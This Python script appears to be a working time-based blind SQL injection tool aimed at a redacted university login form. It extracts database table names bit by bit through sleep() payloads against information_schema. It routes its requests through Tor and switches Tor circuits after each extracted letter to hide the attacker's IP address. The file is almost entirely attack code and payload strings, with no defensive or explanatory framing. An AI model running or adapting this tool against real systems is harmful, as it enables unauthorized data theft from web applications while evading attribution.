#!/usr/bin/env python
# -*- coding: utf-8 -*-

__DATE__ = '27.06.2016'
__AUTHOR__ = ['1ce7ea','cemonatk']

def tor_reload():
	try:
		call('sudo systemctl reload tor', shell=True)
		print "Successfully Connected to New Tor Circuit!"
	except:
		print "Can't changed the Tor node, checking tor status and starting if doesn't working..."
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
	socket.socket = socks.socksocket	
	
def request(url):
	request = Request(url, None)
	return urlopen(request).read()
	
def post(url, data):
	request = Request(url, data)
	t1 = datetime.now().second
	urlopen(request).read()
	t2 = datetime.now().second
	return (t2-t1)

def getname(limit, length, delay):
	name = ""
	url = "http://XXX.edu.XXX/web/XXX.php"
	for i in range(length):
		bit = 1
		letter = 0
		for j in range(8):
			payload = "XXX' AND ( SELECT IF ( (Ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT " + str(limit) + ",1) ," + str(i+1) + ",1)) & " + str(bit) + ")=0 , sleep(0), sleep(" + str(delay) + ") ) ); #"
			query = "XXX="+quote_plus(payload)+"&Sifre=&Sifre1=&Sifre2=&submit=XXX"
#			print payload

			t = post(url, query)
#			print "Response Time: %s" % (t)

			if (t >= delay):
				letter += bit
			bit <<= 1
		name += chr(letter)
		print "Letter found: %c %d" % (chr(letter), letter)
		tor_reload()

	print "Table name: %s" % (name)
"""	print "Testing.."
	
	payload_tmp = "XXX' AND (SELECT * FROM "+name+"); #"
	query_tmp = "XXX="+quote_plus(payload)+"&Sifre=&Sifre1=&Sifre2=&submit=XXX"

	req = Request(url, query_tmp)
	res = urlopen(request).read()

	if "doesn't exist" in res:
		print "Incorrect table name, restarting.."
		getname()
	else:
		print "Table name is correct!"
"""

if __name__ == '__main__':

	import socks,socket
	from subprocess import check_output,call
	from urllib2 import Request,urlopen
	from urllib import quote_plus
	from datetime import datetime
	import time

	tor_reload()
	print "Starting, current IP address: %s" % (request("http://icanhazip.com"))
	getname(1, 15, 3)

	payload_tbllen = "XXX' AND ( SELECT IF ( (length((SELECT table_name FROM information_schema.tables LIMIT 1)))=5 , sleep(0), sleep(5) ) ); #"
	payload_tblnam = "XXX' AND ( SELECT IF ( (Ascii(substr((SELECT table_name FROM information_schema.tables LIMIT 1) ,1,1)) & 1)=0 , sleep(0), sleep(5) ) ); #"